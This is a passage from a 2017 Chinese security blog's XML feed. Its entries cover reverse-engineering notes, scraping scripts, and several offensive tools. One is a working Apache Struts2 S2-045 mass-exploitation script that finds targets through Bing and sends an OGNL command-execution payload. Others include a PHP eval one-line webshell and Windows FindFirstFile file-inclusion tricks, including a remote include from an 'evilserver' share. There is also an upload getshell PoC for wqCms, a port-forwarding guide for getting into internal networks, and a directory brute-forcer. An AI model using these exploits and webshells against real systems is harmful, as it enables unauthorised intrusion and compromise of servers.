0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3 这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码 转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[逆向学习笔记（1）-为什么代码不停地循环运行]]></title>
      <url>%2F2017%2F03%2F09%2Freverse-engineering-study-note-1-why-does-code-keep-running.html</url>
      <content type="text"><![CDATA[对于下面这段c语言代码会一直不停地循环，为什么呢？ 12345678910111213141516171819#include&lt;stdio.h&gt;void HelloWorld()&#123; int i = 0; int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; for(i=0; i&lt;=10; i++) &#123; a[i] = 0; printf("Hello World!\n"); &#125;&#125;int main(int argc, char* argv[])&#123; HelloWorld(); getchar(); return 0;&#125; 问题当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？ 分析我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看 这个函数主要的汇编代码如下12345678910111213141516171819202122232425262728293031328: int i = 0;00401038 mov dword ptr [ebp-4],09: int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;0040103F mov dword ptr [ebp-2Ch],100401046 mov dword ptr [ebp-28h],20040104D mov dword ptr [ebp-24h],300401054 mov dword ptr [ebp-20h],40040105B mov dword ptr [ebp-1Ch],500401062 mov dword ptr [ebp-18h],600401069 mov dword ptr [ebp-14h],700401070 mov dword ptr [ebp-10h],800401077 mov dword ptr [ebp-0Ch],90040107E mov dword ptr [ebp-8],0Ah10: for(i=0; i&lt;=10; i++)00401085 mov dword ptr [ebp-4],00040108C jmp HelloWorld+77h (00401097)0040108E mov eax,dword ptr [ebp-4]00401091 add eax,100401094 mov dword ptr [ebp-4],eax00401097 cmp dword ptr [ebp-4],0Ah0040109B jg HelloWorld+97h (004010b7)11: &#123;12: a[i] = 0;0040109D mov ecx,dword ptr [ebp-4]004010A0 mov dword ptr [ebp+ecx*4-2Ch],013: printf(&quot;Hello World!\n&quot;);004010A8 push offset string &quot;Hello World!\n&quot; (0042301c)004010AD call printf (004011a0)004010B2 add esp,414: &#125;004010B5 jmp HelloWorld+6Eh (0040108e)15: &#125; 从int i = 0;开始看直到for(i=0; i&lt;=10; i++)的堆栈图是 第一次进入循环开始先把0放到了[ebp-4]，然后跳到了00401097 cmp dword ptr [ebp-4],0Ah以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行jg HelloWorld+97h (004010b7)跳到004010b7函数结束第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行0040109D处的语句，此时ECX中的值变成了[ebp-4]中的值也就是0，然后mov dword ptr [ebp+ecx*4-2Ch],0将0放到ebp+ecx*4-2Ch处也就是EBP-2C处，下面的两条语句不用管是执行输出的，然后到了add esp,4将栈顶的值加4，这里我们无需关注栈顶，然后jmp HelloWorld+6Eh (0040108e)跳回到0040108e继续执行 跳到0040108E mov eax,dword ptr [ebp-4]开始执行，紧接着这三条语句的作用是把EBP-4中的值加了1，也就是EBP-4中的值现在为1123mov eax,dword ptr [ebp-4]add eax,1mov dword ptr [ebp-4],eax cmp比较之后再次执行循环体，循环体完成后再次跳到0040108e，此时EBP-28的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的） 紧接着下次执行后 直到这个数组长度为10的数组执行到第十次 此时再次跳转到0040108e，然后EBP-4中的值再次增加了1，现在也就是EBP-4中的值变为了0A，cmp比较之后EBP-4中的值依旧不比0A大，接着执行mov ecx,dword ptr [ebp-4]，此时ECX的值变成了0A，接着执行mov dword ptr [ebp+ecx*4-2Ch],0也就是mov dword ptr [ebp-4],0 然后呢，你发现了什么？？？就是他喵的EBP-4中的值变成了0 变成0代表着什么？？？EBP-4中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址EBP-4中的值清零 这也就是为什么上面这段c语言代码会一直不停地循环的原因 转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[360搜索引擎取真实地址-python代码]]></title>
      <url>%2F2017%2F03%2F08%2F360-Search-Engine-get-realURL-with-python.html</url>
      <content type="text"><![CDATA[还是个比较简单的，不像百度有加密算法 分析1http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou 网址是上面这个样子，没加密直接取就好了，去掉头http://www.so.com/link?url=和尾&amp;q=一直到末尾的部分，剩下的就可以吃了那么规则我们就可以写出来了1a['href'][a['href'].index('?url='):a['href'].index('&amp;q=')][5:] a[&#39;href&#39;]是待处理网址,a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)的部分为?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452 最后还需要用unquote解码 在python3中是urllib.parse.unquote 在python2中是urllib.unquote code123456789101112131415161718192021222324import requestsfrom bs4 import BeautifulSoupfrom urllib.parse import unquoteheaders = &#123; "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"&#125;#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数intdef parse360(keyword, pagenum): keywordsBaseURL = 'https://www.so.com/s?q=' + str(keyword) + '&amp;pn=' pnum = 1 while pnum &lt;= int(pagenum): baseURL = keywordsBaseURL + str(pnum) try: request = requests.get(baseURL, headers=headers) soup = BeautifulSoup(request.text, "html.parser") urls = [unquote(a['href'][a['href'].index('?url='):a['href'].index('&amp;q=')][5:]) for a in soup.select('li.res-list &gt; h3 &gt; a')] for url in urls: yield url except: yield None finally: pnum += 1 用法示例:123456789def main(): for url in parse360("keyword",10): if url: print url else: continueif __name__ == '__main__': main() 最后上一张测试图 转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[s2-045漏洞批量检测工具]]></title>
      <url>%2F2017%2F03%2F07%2Fst2-045-batch-Test-Tool.html</url>
      <content type="text"><![CDATA[今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事 测试图 2017-3-8更新 增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，win版的exe未更新，需要的自行用pyinstaller打包为exe 之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在 win版exe已经打包 重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论 exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子 有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅 依赖包的安装12345//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码pip install requestspip install beautifulsoup4 对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久后来改成关键词就是自己输入，但是又感觉太麻烦然后就变成了现在的读取关键词然后标号直接输入序号就可以途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了 说明例子：1python s2-045.py 9 10 第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数序号与关键词的对应，可以直接运行python s2-045.py就可以产看帮助脚本采用的bing搜索引擎，文件我会打包在下面 上代码,python2和3通用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# encoding:utf-8import sys,requestsfrom bs4 import BeautifulSoupkeyword = &#123;&#125;with open("keyword.txt") as f: i = 0 for keywordLine in f: keyword[str(i)] = keywordLine.strip() i += 1usage = '''usage : python s2-045.py 0 10first parameter is your filenamesecond parameter is your keyword's number which will be used by BingThird parameter is the page number you want to crawl\n'''def poc(actionURL): data = '--447635f88b584ab6b8d9c17d04d79918\ Content-Disposition: form-data; name="image1"\ Content-Type: text/plain; charset=utf-8\ \ x\ --447635f88b584ab6b8d9c17d04d79918--' header = &#123; "Content-Length" : "155", "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36", "Content-Type" : "%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;", &#125; try: request = requests.post(actionURL, data=data, headers=header, timeout = 10) except: return "None", "Refused" return request.text, request.status_codedef returnURLList(): keywordsBaseURL = 'http://cn.bing.com/search?q=' +keyword[sys.argv[1]]+ '&amp;first=' n =0 i = 1 while n &lt; int(sys.argv[2]): baseURL = keywordsBaseURL + str(i) try: req = requests.get(baseURL) soup = BeautifulSoup(req.text, "html.parser") text = soup.select('li.b_algo &gt; h2 &gt; a') if '.action' in keyword[sys.argv[1]]: standardURL = [url['href'][:url['href'].index('.action')]+'.action' for url in text if '.action' in url['href']] elif '.do' in keyword[sys.argv[1]]: standardURL = [url['href'][:url['href'].index('.do')]+'.do' for url in text if '.do' in url['href']] else: standardURL = [url['href'] for url in text] except: print("HTTPERROR") continue i += 10 n += 1 yield standardURLdef main(): if len(sys.argv) != 3: print(usage) for k,v in keyword.items(): print("%s is %s"%(k, v)) sys.exit() for urlList in returnURLList(): for actionURL in urlList: text, code = poc(actionURL) if 'hereisaexp' in text: print(str(code) + "----Successful----" + actionURL + '\n') with open("AvailableURL.txt","a") as f: f.write(actionURL+'\n') else: print(str(code)+'----'+actionURL+'\n')if __name__ == '__main__': main() 下载地址 打包了win版，大家可以直接使用，例如在该exe目录下执行（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）1s2-045.exe 9 10 其他用法参照上面转载请注明出处]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Windows FindFirstFile利用]]></title>
      <url>%2F2017%2F03%2F04%2FWindows-FindFirst-Exploit.html</url>
      <content type="text"><![CDATA[目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。 利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。我们来做个简单的测试，测试代码如下：12345//1.php&lt;?php include($_GET['file']); ?&gt; 再在同目录下新建一个文件名为”123456.txt”的文件，内容为phpinfo()函数，请求/1.php?file=1&lt;&lt;即可包含。 常用的漏洞代码1 1234567&lt;?php if(isset($_GET[page])) &#123; include($_GET[page]); &#125;else&#123; include 'show.php'; &#125;?&gt; 21234567&lt;?php if(isset($_GET[page])) &#123; include('./action/' . $_GET[page]); &#125;else&#123; include './action/show.php'; &#125;?&gt; 31234567&lt;?php if(isset($_GET[page])) &#123; include('./action/'. $_GET[page] . '.php'); &#125;else&#123; include './action/show.php'; &#125;?&gt; 相关代码： php中代码： 123&lt;?php include($_GET['file']);?&gt; 123456.txt中代码： 1&lt;?php phpinfo() ?&gt; 123456.TXT里面可以换成一句话木马，代码： 1&lt;?php eval($_POST["admin"]) ?&gt; url:http://127.0.0.1/1.php?file=12&lt;&lt;密码：admin注意：txt里面书写php代码不能换行写，最好是在同一行书写【原因待查明】 windows的文件系统机制引发的PHP路径爆破问题分析开场白此次所披露的是以下网页中提出的问题所取得的测试结果： http://code.google.com/p/pasc2at/wiki/SimplifiedChinese1234567&lt;?php for ($i=0; $i&lt;255; $i++) &#123; $url = '1.ph' . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($i) . " "; &#125;?&gt; 已知1.php存在，以上脚本访问的结果是：12341.php1.phP1.ph&lt;1.ph&gt; 都能得到返回。前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。 测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0 测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3 经测试我们得出的结论是：该漏洞影响所有的windows+php版本 深入探查模糊测试的结果为了继续深入探查关于该bug的信息，我们对demo做了些许修改:123456789&lt;?php for ($j=0; $i&lt;256; $j++) &#123; for ($i=0; $i&lt;256; $i++) &#123; $url = '1.p' . chr($j) . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($j) . chr($i) . " "; &#125; &#125;?&gt; 在调试php解释器的过程中，我们将此“神奇”的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx).aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。这在2007年msdn公开的文档中被提及：http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3 但是此bug至今未被任何windows旗下所发行的任何版本修复! 我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表： 此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：12345678910111213141516171819202122#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;void _tmain(int argc, TCHAR *argv[])&#123; WIN32_FIND_DATA FindFileData; HANDLE hFind; if( argc != 2 )&#123; _tprintf(TEXT("Usage: %s [target_file] "), argv[0]); return; &#125; _tprintf (TEXT("Target file is %s "), argv[1]); hFind = FindFirstFile(argv[1], &amp;FindFileData); if (hFind == INVALID_HANDLE_VALUE)&#123; printf ("FindFirstFile failed (%d) ", GetLastError()); return; &#125;else&#123; _tprintf (TEXT("The first file found is %s "), FindFileData.cFileName); FindClose(hFind); &#125;&#125; 当传入参数”c:o&lt;”时，成功访问到boot.ini文件。 利用方法总结 当调用FindFirstFile()函数时，”&lt;”被替换成” ”,这意味该规则可以使”&lt;”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，**为了确保能够使”&lt;”被替换成””,应当采用”&lt;&lt;”** 1EXAMPLE:include(‘shell&lt;&apos;); 或者include(‘shell&lt;&lt;&apos;); //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，”&gt;”被替换成”?”,这意味这”&gt;”可以替换单个任意字符 1EXAMPLE：include(‘shell.p&gt;p&apos;); //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。 当调用FindFirstFile()函数时，”””(双引号)被替换成”.” 1EXAMPLE:include(‘shell”php&apos;); //===&gt;include(‘shell.php&apos;); 如果文件名第一个字符是”.”的话，读取时可以忽略之 1EXAMPLE：fopen(‘.htacess&apos;); //==&gt;fopen(‘htacess&apos;); //加上第一点中的利用 ==&gt;fopen(‘h&lt;&lt;&apos;); 文件名末尾可以加上一系列的/或者的合集，你也可以在/或者中间加上.字符，只要确保最后一位为”.” 1EXAMPLE：fopen(“config.ini\.// ///.”);==&gt; fopen(‘config.ini./..&apos;); ==&gt;fopen(‘config.ini/////.&apos;)==&gt;fopen(‘config.ini…..&apos;) //译者注：此处的利用我不是很理解，有何作用？截断？ 该函数也可以调用以”\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含） 1EXAMPLE：include (‘\evilservershell.php&apos;); 用以下方法还可以切换文件的盘名 1include(‘\.C:myfile.php......D:anotherfile.php&apos;); 选择磁盘命名语法可以用来绕过斜线字符过滤 1file_get_contents(‘C:boot.ini&apos;); //==&gt; file_get_contents (‘C:/boot.ini&apos;); 在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节 123EXAMPLE:file_get_contents(‘C:/tmp/con.jpg&apos;); //此举将会无休无止地从CON设备读取0字节，直到遇到eofEXAMPLE:file_put_contents(‘C:/tmp/con.jpg&apos;,chr(0×07)); //此举将会不断地使服务器发出类似哔哔的声音 更深入的利用方法除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤 请思考该例：1234&lt;?php file_get_contents("/images/".$_GET['a'].".jpg"); //or another function from Table 1, i.e. include().?&gt; 访问test.php?a=../a&lt;%00 可能出现两种结果 Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。 Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。 如果是第一种情况，说明不存在a打头的文件，第二种则存在。 此外，有记录显示，有时网站会抛出如下错误：1Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied.. 这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。 结论实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。 因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。 Referer PHP application source code audits advanced technology: http://code.google.com/p/pasc2at/wiki/SimplifiedChinese MSDN FindFirstFile Function reference: http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx MSDN comments history: http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3 MSDN article «Naming Files, Paths, and Namespaces»: http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx Technet article «Managing Files and Directories»: http://technet.microsoft.com/en-us/library/cc722482.aspx Paper «Technique of quick exploitation of 2blind SQL Injection»: http://www.exploit-db.com/papers/13696/ 全文完。 注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。 文章转自群友 版权声明：文章所设计内容包括两部分一是法师的书籍《代码审计-企业级web代码安全架构》二是来自群友@evil7提供的资料以下为资料原文：http://www.169it.com/blog_article/2302639890.htmlhttps://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[wqCms6.0在IIS6的Getshell]]></title>
      <url>%2F2017%2F02%2F22%2FwqCms6.0%E5%9C%A8IIS6%E7%9A%84Getshell.html</url>
      <content type="text"><![CDATA[2017-02-15发布 一、漏洞利用点漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点 二、hack it 三、POC123456789&lt;html&gt; &lt;body&gt; &lt;form action="http://127.0.0.1/admin_UploadDataHandler.ashx" method="POST"enctype="multipart/form-data"&gt; &lt;input type="file" name="uploadify" /&gt; &lt;input type="text" name="saveFile" value="admin" /&gt; &lt;input type="submit" name="Upload" value="Submit Query" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 转自群友论坛文章wobushou]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[otunnel：一个和lcx差不多的端口转发的工具]]></title>
      <url>%2F2017%2F02%2F15%2Fotunnel%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[这是一个采用Golang编写的和lcx差不多的端口转发的工具，用来突破内网环境 项目地址ooclab/otunnel 下载地址(内涵各大平台)http://dl.ooclab.com/otunnel/ otunnel 用法前提： 假设 server 的地址为 example.com 从 client 能连接 server (client 与 server 无需在同一个网络) 注意 otunnel 程序可以作为 server 和 client 两种角色（运行参数不同） 快速上手server1./otunnel listen :10000 -s longlongsecret client反向代理举例：将 client 可以访问的 192.168.1.3:22 映射到 server 上的 10022 端口：1./otunnel connect example.com:10000 -s longlongsecret -t 'r:192.168.1.3:22::10022' 现在访问 example.com:10022 即等于访问了 client 内网的 192.168.1.3:22 正向代理举例：假设 example.com 的 127.0.0.1:3128 服务（你懂得），在 client 运行：1./otunnel connect example.com:10000 -s longlonglongsecret -t 'f::20080:127.0.0.1:3128' 现在 client 的 20080 端口， 等于访问 example.com 上的 127.0.0.1:3128 程序用法-t 格式包含多个字段信息，以:隔开(为空的字段也不能省略:)。 1代理类型:本地地址:本地端口:远程地址:远程端口 字段 含义 代理类型 r 表示反向代理; f 表示正向代理 本地地址 IP或域名 本地端口 整数 远程地址 IP或域名 远程端口 整数 注意 本地地址或远程地址如果为空，表示所有网口 otunnel 命令行可以包含多个-t选项，同时指定多条隧道规则 特点及优势otunnel 是一款对称的安全隧道工具。 单二进制程序：otunnel 为一个独立的二进制程序，可以作为 server 和 client 端。 支持多操作系统平台：支持GNU/Linux, Unix-like, Mac, Windows，其他如 ddwrt 等 arm 平台。 无需配置文件：命令行使用 对称设计：同时支持 正、反向代理（端口映射） 安全加密：支持 AES 对称加密]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang初练手-多线程网站路径爆破]]></title>
      <url>%2F2017%2F02%2F08%2Ffirst-practice-for-Golang-Multithread-Website-Burster.html</url>
      <content type="text"><![CDATA[以前用Python写过这个工具，前两天看了golang的基础，就想着用这个语言把这个工具重写一遍 先放张图 用法123456Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5Buster是你的程序名字-u后面填网址参数，格式如上-d选字典-t是线程数当你第一次运行请直接在命令行运行你的程序，什么参数都别加，他会有提示信息告诉你怎么做的 话不多说，直接上代码，字典采用的以前搜集的一个珍藏的大字典，跑起来可能耗时比较久，文件外链会放在底下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134package mainimport ( "bufio" "flag" "fmt" "io/ioutil" "net/http" "os" "sync")var urls chan stringvar no404URL = make(chan string)var wg sync.WaitGroup //等待goroutine完成func main() &#123; var baseURL string var dicPath string var threadCount int flag.StringVar(&amp;baseURL, "u", "https://www.baidu.com", "website which you want to burst") flag.StringVar(&amp;dicPath, "d", "asp.txt", "dic which you want to use") flag.IntVar(&amp;threadCount, "t", 5, "number of Thread") flag.Parse() if len(os.Args) == 1 &#123; fmt.Println("------------------------------------") fmt.Println(" Author | Akkuamn") fmt.Println("------------------------------------") fmt.Println(" Update-v1.0 | 2017-02-07") fmt.Println("-------------------------------------") fmt.Printf("\nUsage : \n\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\n\n", os.Args[0]) fmt.Printf("View more help via %s -h\n\n", os.Args[0]) listDic("dic") &#125; else &#123; dicPath = "./dic/" + dicPath start(baseURL, dicPath, threadCount) wg.Wait() //等待goroutine完成 &#125;&#125;func start(baseURL string, dicPath string, threadCount int) &#123; dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, 0) if dicError != nil &#123; fmt.Printf("\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n") return &#125; defer dicFile.Close() //把处理后的需要爆破的url全部传到信道urls ReturnBurstURL(dicFile, baseURL) //单独开goroutine从信道no404URL取数据写入文件 go func() &#123; resultTxt, err := os.OpenFile("result.txt", os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0660) if err != nil &#123; fmt.Println("OpenFile Error:" + err.Error()) &#125; resultWriter := bufio.NewWriter(resultTxt) defer resultTxt.Close() for &#123; _, err = resultWriter.WriteString(&lt;-no404URL) if err != nil &#123; fmt.Println("resultWriter Error:" + err.Error()) &#125; resultWriter.Flush() &#125; &#125;() //并发访问网址并将状态码不为404的网址加入信道no404URL for i := 0; i &lt; threadCount; i++ &#123; wg.Add(1) go func(i int) &#123; for len(urls) &gt; 0 &#123; url := &lt;-urls status := HTTPStatus(url) fmt.Printf("[%d]%s-----%s\n", i, status, url) if status != "404 Not Found" &#123; no404URL &lt;- status + "-----" + url + "\n" &#125; &#125; wg.Done() &#125;(i) &#125;&#125;//返回HTTP访问状态码func HTTPStatus(url string) (status string) &#123; client := http.DefaultClient reqest, err := http.NewRequest("HEAD", url, nil) if err == nil &#123; reqest.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0") reqest.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8") response, err1 := client.Do(reqest) if err1 != nil &#123; fmt.Println("HTTPRequest Error:" + err1.Error()) &#125; defer response.Body.Close() return response.Status &#125; else &#123; fmt.Println("NewRequest Error:" + err.Error()) return "400 Bad Request" &#125;&#125;//把处理后的需要爆破的url全部传到信道urlsfunc ReturnBurstURL(fURL *os.File, baseurl string) &#123; var urlList []string allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() &#123; newurl := baseurl + "/" + allURLTxt.Text() urlList = append(urlList, newurl) &#125; urls = make(chan string, len(urlList)) for _, url := range urlList &#123; urls &lt;- url &#125; fmt.Printf("\n读取字典完成，准备开始，请等待...\n")&#125;//罗列出可用字典func listDic(dicDir string) &#123; dirList, err := ioutil.ReadDir(dicDir) if err != nil &#123; fmt.Println("ReadDir Error : " + err.Error() + "\n") &#125; fmt.Println("Dic you can select : ") for _, file := range dirList &#123; fmt.Printf(" %s\n", file.Name()) &#125;&#125; 只编译了win平台下的，如果有需要可以自行编译 源码及字典及win程序密码: g1gd]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang踩坑录 两种方式来读取文件一行所导致的问题]]></title>
      <url>%2F2017%2F02%2F04%2FGolang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html</url>
      <content type="text"><![CDATA[前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题我要做的东西是网站路径爆破所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题 下面是一个小片段123400 Bad Request-----http://www.xxx.com/channel.asp400 Bad Request-----http://www.xxx.com/index.asp404 Not Found-----http://www.xxx.com/admin.asp 程序本身并没有错误，但是运行结果就比较怪了Bad Request?这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request经过几轮测试，我觉得应该是网址拼接上出了问题 我的拼接函数是这样123456789101112func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) &#123; allURLTxt := bufio.NewReader(fURL) for &#123; urlpath, readerError := allURLTxt.ReadString('\n') newurl := baseurl + strings.Replace(urlpath, "\n", "", -1) urlList = append(urlList, newurl) if readerError == io.EOF &#123; 